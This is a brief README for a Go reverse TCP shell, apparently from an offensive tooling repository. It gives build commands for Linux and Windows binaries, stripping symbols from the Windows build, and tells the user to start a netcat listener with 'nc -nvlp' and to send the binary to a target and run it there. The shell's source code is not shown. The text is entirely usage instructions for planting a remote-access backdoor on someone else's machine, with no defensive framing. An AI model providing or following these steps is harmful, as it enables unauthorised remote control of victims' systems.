## GO REVERSE TCP
- Change value of RHOST and RPORT with Your Own
- Make Sure you have installed Golang
- Run Command For Linux Based ````go build go-reverseunixtcp.go````
- Run Command For Windows Based ````GOOS=windows go build -o go-reversewindowstcp.exe -ldflags="-s -w" go-reversewindowstcp.go````
- You must take the network listen just like ````nc -nvlp [your rport settings]````
- Send it Into your target and run it 
